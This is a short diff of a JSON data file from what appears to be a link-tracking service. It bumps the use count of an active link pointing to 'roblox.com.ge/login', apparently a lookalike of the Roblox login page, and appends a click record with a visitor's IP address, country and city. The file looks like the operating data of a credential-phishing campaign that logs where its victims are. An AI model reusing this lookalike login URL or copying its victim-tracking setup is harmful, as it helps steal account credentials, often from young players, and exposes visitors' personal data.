@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1691,
+    "useCount": 1692,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13696,6 +13696,14 @@
         "city": "Tapejara",
         "flag": "🇧🇷",
         "countryCode": "BR"
+      },
+      {
+        "timestamp": 1777651481518,
+        "ip": "171.226.237.39",
+        "country": "Vietnam",
+        "city": "Can Tho",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
